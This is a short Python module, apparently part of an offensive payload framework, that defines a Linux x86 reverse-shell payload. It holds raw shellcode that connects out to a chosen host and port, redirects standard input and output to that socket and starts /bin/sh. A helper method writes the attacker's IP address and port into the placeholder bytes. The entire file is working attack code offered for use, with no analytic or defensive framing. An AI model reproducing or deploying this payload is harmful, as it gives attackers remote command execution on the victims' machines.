import struct
import socket
import typing
from core import payloadcore
from shells import shellsindex


class ReverseLinuxx86(payloadcore.Payload):

    AUTHOR: str = "Danakane"

    def __init__(self):
        payloadbin: bytes = b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2" \
                            b"\x52\x53\x6a\x02\x89\xe1\xcd\x80" \
                            b"\x92\xb0\x66\x68\x00\x00\x00\x00" \
                            b"\x66\x68\x00\x00\x43\x66\x53\x89" \
                            b"\xe1\x6a\x10\x51\x52\x89\xe1\x43" \
                            b"\xcd\x80\x6a\x02\x59\x87\xda\xb0" \
                            b"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b" \
                            b"\x41\x89\xca\x52\x68\x2f\x2f\x73" \
                            b"\x68\x68\x2f\x62\x69\x6e\x89\xe3" \
                            b"\xcd\x80"
        super(ReverseLinuxx86, self).__init__()
        self.customize(payloadbin, shellsindex.ShellsIndex.basicreverse)

    def parseparameters(self, host: str, port: int) -> bytes:
        hostbin: bytes = struct.pack(">L", struct.unpack(">L", socket.inet_aton(host))[0])
        if port <= 0 or port > 65535:
            raise ValueError("Incorrect port number: " + str(port))
        portbin = struct.pack(">H", port)
        payloadbin = self.binary()
        payloadbin = payloadbin.replace(b"\x00\x00\x00\x00", hostbin)
        payloadbin = payloadbin.replace(b"\x00\x00", portbin)
        return payloadbin


blueprint: typing.Callable = ReverseLinuxx86
